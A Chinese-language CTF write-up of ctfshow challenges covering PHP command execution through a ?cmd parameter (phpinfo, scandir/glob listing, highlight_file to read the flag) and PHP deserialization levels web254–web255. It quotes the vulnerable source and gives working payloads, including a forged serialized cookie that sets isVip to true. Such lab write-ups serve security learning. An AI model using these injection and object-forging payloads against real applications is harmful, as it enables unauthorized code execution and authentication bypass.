## ctfshow web12
考察:命令执行
知识点:
```
glob() 函数返回匹配指定模式的文件名或目录。
举个例子:
glob("*") 匹配任意文件
glob("*.txt")匹配以txt为后缀的文件
```

查看网页源代码发现 ?cmd
![图片](https://user-images.githubusercontent.com/81904597/113653035-9822ae00-96c7-11eb-9fbe-2ee06d317b0c.png)
目测考察命令执行
输出一下phpinfo()
```
?cmd=phpinfo();
```
里面禁用了很多函数
![图片](https://user-images.githubusercontent.com/81904597/113653163-e172fd80-96c7-11eb-88c1-a5df058909e2.png)

查看一下目录的文件(两种方式)
```
?cmd=print_r(scandir('.'));
?cmd=print_r(glob("*"));
```
![图片](https://user-images.githubusercontent.com/81904597/113653282-1ed78b00-96c8-11eb-9319-97b2312427af.png)
利用下面的让代码显示一下即可
```
highlight_file()
show_source()
```
参考yu师傅博客:https://blog.csdn.net/miuzzx/article/details/104372662


##ctfshow 反序列化刷题
### 魔术方法
```

    __construct()当一个对象创建时被调用(构造函数)

    __destruct()当一个对象销毁时被调用(析构函数)

    __toString()当一个对象被当作一个字符串使用

    __sleep() 在对象在被序列化之前运行

    __wakeup将在序列化之后立即被调用所写的内容需要有对象中的成员
    
```

web254
```

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 

```

```

?username=xxxxxx&password=xxxxxx

```

web255

```

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 
```

```

<?php
class ctfShowUser{
    public $isVip=true;
    
}
echo serialize(new ctfShowUser);
要对反序列化后的;进行url编码
#user=O:11:"ctfShowUser":1:{s:5:"isVip"%3bb:1%3b}
```
